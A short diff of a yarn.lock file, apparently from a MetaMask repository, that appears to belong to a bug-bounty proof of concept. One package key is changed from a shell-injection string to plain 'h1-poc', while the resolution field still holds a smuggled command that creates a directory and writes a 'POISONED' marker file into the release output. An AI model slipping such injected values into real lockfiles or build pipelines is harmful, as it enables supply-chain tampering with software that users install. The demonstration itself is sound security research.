@@ -11855,7 +11855,7 @@ __metadata:
   languageName: node
   linkType: hard
 
-"h1-poc; mkdir -p packages/h1-poc-verify/dist; echo 'OFFICIAL METAMASK RELEASE - POISONED BY ANOMALY' > packages/h1-poc-verify/dist/poison.txt; #":
+"h1-poc":
   version: 0.0.0-use.local
   resolution: "h1-poc; mkdir -p packages/h1-poc-verify/dist; echo 'OFFICIAL METAMASK RELEASE - POISONED BY ANOMALY' > packages/h1-poc-verify/dist/poison.txt; #"
   languageName: unknown
